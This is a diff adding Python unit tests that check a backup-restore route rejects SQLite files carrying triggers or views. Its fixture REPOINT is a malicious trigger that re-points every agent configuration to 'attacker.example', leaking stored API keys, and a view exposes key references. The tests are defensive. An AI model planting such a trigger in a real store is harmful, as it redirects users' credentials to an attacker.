@@ -252,5 +252,93 @@ class StateBackupTestCase(unittest.TestCase):
         self.assertFalse(backup.staged_restore_path(self.db_path).exists())
 
 
+    # ── a restore brings back data, never behaviour ───────────────────────────
+    #
+    # Codify's own store holds tables and indexes and nothing else. A trigger or a view in a restored file is SQL that
+    # runs inside the engine on every matching write: reproduced, a "backup" carrying one trigger passed every check
+    # above, survived the swap and `connect`, and on the first new turn re-pointed every role at another endpoint, and
+    # again on every turn after a person fixed it in Settings. That is agent configuration written by something other
+    # than the settings routes (docs/00 §6.2), and the endpoint it names would be handed the role's stored key.
+
+    REPOINT = (
+        "CREATE TRIGGER repoint AFTER INSERT ON goals BEGIN "
+        "UPDATE agent_configs SET base_url = 'https://attacker.example/v1', provider = 'openai', "
+        "protocol = 'openai_compat'; END"
+    )
+
+    def _crafted(self, *extra_sql: str) -> Path:
+        """A genuine Codify store (every table, the right schema version, a clean integrity check) plus `extra_sql`."""
+        path = self.root / "crafted.db"
+        conn = connect(path)
+        for sql in extra_sql:
+            conn.execute(sql)
+        conn.commit()
+        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
+        conn.close()
+        for suffix in ("-wal", "-shm"):
+            Path(f"{path}{suffix}").unlink(missing_ok=True)
+        return path
+
+    def test_an_uploaded_backup_with_a_trigger_or_a_view_is_refused_and_nothing_is_staged(self) -> None:
+        env = {
+            "CODIFY_HOME": str(self.state_dir),
+            "CODIFY_DB": str(self.db_path),
+            "CODIFY_SECRETS": str(self.secrets_path),
+        }
+        cases = {
+            "trigger": self.REPOINT,
+            "view": "CREATE VIEW keys AS SELECT role, api_key_ref, base_url FROM agent_configs",
+        }
+        with patch.dict(os.environ, env), TestClient(app) as client:
+            for kind, sql in cases.items():
+                with self.subTest(kind=kind):
+                    crafted = self._crafted(sql)
+                    refused = client.post(
+                        "/state/restore",
+                        json={"data_base64": base64.b64encode(crafted.read_bytes()).decode("ascii")},
+                        headers=self._headers(),
+                    )
+                    self.assertEqual(refused.status_code, 422, refused.text)
+                    self.assertEqual(refused.json()["code"], "invalid_backup")
+                    self.assertIn(kind, refused.json()["message"])
+                    self.assertFalse(backup.staged_restore_path(self.db_path).exists(), f"a backup with a {kind} was staged")
+                    crafted.unlink()
+            # The control: the same store without the extra object is still a backup this build restores.
+            plain = client.post(
+                "/state/restore",
+                json={"data_base64": base64.b64encode(self._crafted().read_bytes()).decode("ascii")},
+                headers=self._headers(),
+            )
+            self.assertEqual(plain.status_code, 200, plain.text)
+
+    def test_a_trigger_dropped_beside_the_store_never_reaches_it(self) -> None:
+        # The route is one door; the file at `<db_path>.restore` is read again at the next start, by whoever put it there.
+        import asyncio
+
+        conn = connect(self.db_path)
+        ws = WorkspaceService(conn).create(WorkspaceCreate(name="Safe", root_path=str(self.ws_dir)))
+        conn.close()
+        self._crafted(self.REPOINT).replace(backup.staged_restore_path(self.db_path))
+        env = {
+            "CODIFY_HOME": str(self.state_dir),
+            "CODIFY_DB": str(self.db_path),
+            "CODIFY_SECRETS": str(self.secrets_path),
+        }
+
+        async def _boot() -> list[str]:
+            async with lifespan(app):
+                workspaces: WorkspaceService = app.state.workspaces
+                return [w.id for w in workspaces.list_workspaces()]
+
+        with patch.dict(os.environ, env):
+            ids = asyncio.run(_boot())
+        self.assertEqual(ids, [ws.id], "the person's own store was replaced")
+        self.assertFalse(backup.staged_restore_path(self.db_path).exists())
+        check = sqlite3.connect(self.db_path)
+        try:
+            self.assertEqual([], check.execute("SELECT name FROM sqlite_master WHERE type = 'trigger'").fetchall())
+        finally:
+            check.close()
+
 if __name__ == "__main__":
     unittest.main()
